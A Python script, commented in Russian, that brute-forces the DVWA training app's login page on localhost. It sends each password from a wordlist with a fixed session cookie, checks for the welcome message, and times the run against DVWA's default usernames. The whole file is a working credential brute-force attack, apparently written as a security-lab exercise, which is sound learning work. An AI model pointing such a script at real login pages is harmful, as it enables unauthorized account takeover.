import requests # библиотека для посылания запросов на сайт.
import time

#import multiprocessing as mp #для создания процессов
#from multiprocessing import Value # для создания переменной, к которой имеют доступ все процессы

passwords = [] # список паролей из файла passwords.txt

# функция, проверяет правильность логина и пароля
def try_auth(login, password):
    cookies = dict(PHPSESSID='766lscs8lsvqioagk0u70v221c', security='low') # куки нужны для входа на страницу задания bruteforce (иначе выкинет)
    r = requests.get('http://localhost/dvwa/vulnerabilities/brute/', params={'username': login, 'password': password, 'Login': 'Login'}, # отправка запроса
     cookies=cookies)
    
    if r.text.find("Welcome to the password protected") != -1: # проверяем, что удалось войти.
        return True
    return False

def get_passw(idx): # получает пароль из списка
    return passwords[idx].strip() # удаляет пробелы в начале и конце

def bruteforce_thread(login, start, end): # выполняет брутфорс
    for i in range(start, end):
        password = get_passw(i) # получаем пароль с индексом i
        res = try_auth(login, password) # пробуем аутентифицироваться
        if res == True: # удалось найти пароль
            print(f'Found password for user {login}: {password}!') # выводим логин пользователя, найденный пароль и номер потока
            break

def bruteforce(login): #функция(запускает потоки) которая производит перебор паролей и подставляет и замеряет время
    start_time = time.perf_counter()

    N = len(passwords) # количество паролей (строк в Файле passwords.txt)
    start = 0 # с какого пароля начать
    end = start + N # на каком пароле закончить
    bruteforce_thread(login, start, end)
    start = end #с какого пароля начинать и на каком заканчивать распределение между потоками поровно

    # как считаем время 
    # смотрим когда начали выполнение и потом когда закончили и затем вычитаем
    end_time = time.perf_counter() # возвращает время текущее
    elapsed = end_time - start_time
    print("Exec time: {}.".format(elapsed))


f = open("passwords.txt", "r") # открываем файл passwords.txt для чтения
passwords = f.readlines() # читаем все строки из этого файла и записываем в перменную passwords
#bruteforce("admin") # выполняем брутфорс паролей у пользователя admin
bruteforce("1337")
#bruteforce("gordonb")
#bruteforce("pablo")
#bruteforce("smithy")